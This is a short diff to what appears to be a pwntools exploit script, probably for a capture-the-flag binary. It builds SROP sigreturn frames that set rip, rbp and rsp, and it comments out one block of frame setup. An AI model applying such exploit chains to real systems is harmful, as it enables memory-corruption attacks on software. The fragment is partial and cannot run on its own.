@@ -100,7 +100,7 @@ def exploit(p,e):
 
     chain2 += p64(sigreturn_sys) + bytes(frame)
     
-
+    """
     frame = SigreturnFrame(kernel='amd64')
     frame.rip = syscall_ret
     frame.rbp = buffer
@@ -126,6 +126,7 @@ def exploit(p,e):
     frame.rsp = buffer + memory_size + (frame_size) * i
 
     chain2 += p64(sigreturn_sys) + bytes(frame)
+    """
  
 
     frame.rsp = buffer + memory_size + (frame_size) * i
